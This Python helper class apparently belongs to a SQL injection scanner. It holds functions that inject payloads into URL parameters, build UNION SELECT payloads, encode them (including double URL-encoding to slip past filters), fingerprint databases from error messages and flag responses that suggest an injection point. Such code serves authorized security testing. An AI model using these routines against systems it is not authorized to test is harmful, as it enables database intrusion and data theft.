import re
import hashlib
import urllib.parse
import random
import string
import datetime

class Helpers:
    @staticmethod
    def generate_random_string(length=10):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    @staticmethod
    def generate_random_int(min_val=1, max_val=100):
        return random.randint(min_val, max_val)
    
    @staticmethod
    def parse_url(url):
        parsed = urllib.parse.urlparse(url)
        return {
            'scheme': parsed.scheme,
            'netloc': parsed.netloc,
            'hostname': parsed.hostname,
            'port': parsed.port,
            'path': parsed.path,
            'params': urllib.parse.parse_qs(parsed.query),
            'query': parsed.query,
            'fragment': parsed.fragment
        }
    
    @staticmethod
    def extract_params(url, data=None):
        parsed = Helpers.parse_url(url)
        params = {}
        
        if parsed['params']:
            params.update(parsed['params'])
        
        if data:
            if isinstance(data, str):
                params.update(urllib.parse.parse_qs(data))
            elif isinstance(data, dict):
                params.update(data)
        
        return params
    
    @staticmethod
    def inject_payload(url, param, payload, technique='replace'):
        parsed = Helpers.parse_url(url)
        query_params = urllib.parse.parse_qs(parsed['query'])
        
        if param in query_params:
            if technique == 'replace':
                query_params[param] = [payload]
            elif technique == 'append':
                query_params[param] = [query_params[param][0] + payload]
            elif technique == 'quote':
                query_params[param] = [f"'{payload}'"]
        
        new_query = urllib.parse.urlencode(query_params, doseq=True)
        new_url = f"{parsed['scheme']}://{parsed['netloc']}{parsed['path']}"
        if new_query:
            new_url += f"?{new_query}"
        if parsed['fragment']:
            new_url += f"#{parsed['fragment']}"
        
        return new_url
    
    @staticmethod
    def calculate_md5(text):
        return hashlib.md5(text.encode()).hexdigest()
    
    @staticmethod
    def calculate_sha256(text):
        return hashlib.sha256(text.encode()).hexdigest()
    
    @staticmethod
    def normalize_string(text):
        return ' '.join(text.split()).strip()
    
    @staticmethod
    def extract_error_message(text, db_type='generic'):
        patterns = {
            'mysql': [
                r"MySQLSyntaxErrorException[:\s]*(.+?)(?:\n|$)",
                r"you have an error in your sql syntax.*?near '(.+?)'",
                r"mysqli_?query\(\)\s*[.:]\s*\w+\s*\(\s*'(.+?)'\s*\)",
                r"wordpress_db_error[:\s]*(.+?)(?:\n|$)"
            ],
            'postgresql': [
                r"PostgreSQL\s*[\d.]*:\s*(.+?)(?:\n|$)",
                r"pg_?query\(\)\s*\(\s*'\s*(.+?)\s*'\s*\)",
                r"syntax error at or near '(.+?)'"
            ],
            'mssql': [
                r"microsoft\s*(?:sql\s*)?server\s*error\s*\d+[:\s]*(.+?)(?:\n|$)",
                r"unclosed quotation mark after the character string '(.+?)'",
                r"exec\(\)\s*failed[:\s]*(.+?)(?:\n|$)"
            ],
            'oracle': [
                r"ORA-\d{5}[:\s]*(.+?)(?:\n|$)",
                r"oracle\.jdbc\.driver\.OracleException[:\s]*(.+?)(?:\n|$)"
            ],
            'sqlite': [
                r"sqlite3\.OperationalError[:\s]*(.+?)(?:\n|$)",
                r"unrecognized token[:\s]*\"(.+?)\""
            ],
            'generic': [
                r"sql\s*syntax.*?(.+?)(?:\n|$)",
                r"syntax error.*?(.+?)(?:\n|$)",
                r"warning.*?mysql.*?(.+?)(?:\n|$)",
                r"fatal error.*?(.+?)(?:\n|$)"
            ]
        }
        
        db_patterns = patterns.get(db_type.lower(), patterns['generic'])
        
        for pattern in db_patterns:
            match = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1).strip()
        
        return None
    
    @staticmethod
    def detect_db_type(error_message):
        error_lower = error_message.lower()
        
        if 'mysql' in error_lower or 'mysqli' in error_lower or 'mariadb' in error_lower:
            return 'MySQL'
        elif 'postgresql' in error_lower or 'pg_' in error_lower:
            return 'PostgreSQL'
        elif 'microsoft' in error_lower or 'sql server' in error_lower or 'mssql' in error_lower:
            return 'MSSQL'
        elif 'oracle' in error_lower or 'ora-' in error_lower:
            return 'Oracle'
        elif 'sqlite' in error_lower:
            return 'SQLite'
        
        return 'Unknown'
    
    @staticmethod
    def is_vulnerable_response(response, baseline, threshold=0.8):
        if response == baseline:
            return False, "No difference detected"
        
        differences = 0
        total_checks = 5
        
        if len(response) != len(baseline):
            differences += 1
        
        if 'error' in response.lower() and 'error' not in baseline.lower():
            differences += 1
        
        if 'sql' in response.lower() and 'sql' not in baseline.lower():
            differences += 1
        
        words_response = set(response.lower().split())
        words_baseline = set(baseline.lower().split())
        
        if abs(len(words_response) - len(words_baseline)) > 5:
            differences += 1
        
        common_words = len(words_response & words_baseline)
        total_words = len(words_baseline)
        
        if total_words > 0:
            similarity = common_words / total_words
            if similarity < threshold:
                differences += 1
        
        similarity_score = differences / total_checks
        
        return similarity_score > 0.3, f"Difference score: {similarity_score:.2f}"
    
    @staticmethod
    def format_time(seconds):
        if seconds < 60:
            return f"{seconds:.2f}s"
        elif seconds < 3600:
            minutes = seconds // 60
            secs = seconds % 60
            return f"{int(minutes)}m {secs:.1f}s"
        else:
            hours = seconds // 3600
            minutes = (seconds % 3600) // 60
            return f"{int(hours)}h {int(minutes)}m"
    
    @staticmethod
    def format_size(bytes_size):
        for unit in ['B', 'KB', 'MB', 'GB']:
            if bytes_size < 1024:
                return f"{bytes_size:.2f} {unit}"
            bytes_size /= 1024
        return f"{bytes_size:.2f} TB"
    
    @staticmethod
    def sanitize_filename(filename):
        keepcharacters = (' ', '.', '_', '-')
        return "".join(c for c in filename if c.isalnum() or c in keepcharacters).rstrip()
    
    @staticmethod
    def parse_cookies(cookie_string):
        cookies = {}
        if cookie_string:
            for part in cookie_string.split(';'):
                if '=' in part:
                    key, value = part.strip().split('=', 1)
                    cookies[key.strip()] = value.strip()
        return cookies
    
    @staticmethod
    def parse_headers(headers_string):
        headers = {}
        if headers_string:
            for part in headers_string.split('\n'):
                if ':' in part:
                    key, value = part.split(':', 1)
                    headers[key.strip()] = value.strip()
        return headers
    
    @staticmethod
    def create_brackets_payload(payload_type, count=4):
        if payload_type == 'union_null':
            return ' UNION SELECT ' + ', '.join(['NULL'] * count)
        elif payload_type == 'union_string':
            return " UNION SELECT '" + "', '".join(['1'] * count) + "'"
        elif payload_type == 'union_number':
            return ' UNION SELECT ' + ', '.join([str(i) for i in range(1, count + 1)])
        return ''
    
    @staticmethod
    def encode_payload(payload, encoding='url'):
        if encoding == 'url':
            return urllib.parse.quote(payload)
        elif encoding == 'double_url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == 'base64':
            import base64
            return base64.b64encode(payload.encode()).decode()
        elif encoding == 'hex':
            return payload.encode().hex()
        return payload
